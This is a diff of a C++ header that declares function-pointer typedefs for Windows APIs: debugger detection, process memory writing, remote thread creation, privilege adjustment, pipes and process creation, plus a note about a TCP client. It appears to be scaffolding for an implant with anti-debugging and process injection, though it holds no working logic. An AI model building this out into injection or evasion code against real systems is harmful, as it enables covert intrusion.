@@ -1,14 +1,9 @@
 #pragma once
-
 #include <windows.h>
 #include <TlHelp32.h>
 
-//typedef BOOL (WINAPI* IsDebuggerPresent_t)();
-//typedef HANDLE (WINAPI* OpenProcess_t)(DWORD, BOOL, DWORD);
-//typedef BOOL (WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
-//typedef HANDLE (WINAPI* CreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
-//typedef LPVOID (WINAPI* VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
 typedef decltype(IsDebuggerPresent)* IsDebuggerPresent_t;
+typedef decltype(ExitThread)* ExitThread_t;
 typedef decltype(OpenProcess)* OpenProcess_t;
 typedef decltype(WriteProcessMemory)* WriteProcessMemory_t;
 typedef decltype(CreateRemoteThread)* CreateRemoteThread_t;
@@ -20,9 +15,15 @@ typedef decltype(AdjustTokenPrivileges)* AdjustTokenPrivileges_t;
 typedef decltype(OpenProcessToken)* OpenProcessToken_t;
 typedef decltype(GetCurrentProcess)* GetCurrentProcess_t;
 typedef decltype(Sleep)* Sleep_t;
-typedef decltype(WSAStartup)* WSAStartup_t;
-typedef decltype(WSACleanup)* WSACleanup_t;
-typedef decltype(WSAGetLastError)* WSAGetLastError_t;
+typedef decltype(GetLastError)* GetLastError_t;
+typedef decltype(FormatMessageA)* FormatMessageA_t;
+typedef decltype(LocalFree)* LocalFree_t;
+typedef decltype(CreateProcessA)* CreateProcessA_t;
+typedef decltype(CreatePipe)* CreatePipe_t;
+typedef decltype(SetHandleInformation)* SetHandleInformation_t;
+typedef decltype(ReadFile)* ReadFile_t;
+
+// Note: Due to header conflicts between windows.h and WS2tcpip.h, ws2_32.dll related function signatures are directly declared in the TCPClient.h header.
 
 typedef NTSTATUS NtSetInformationThread(
 	HANDLE					  ThreadHandle,
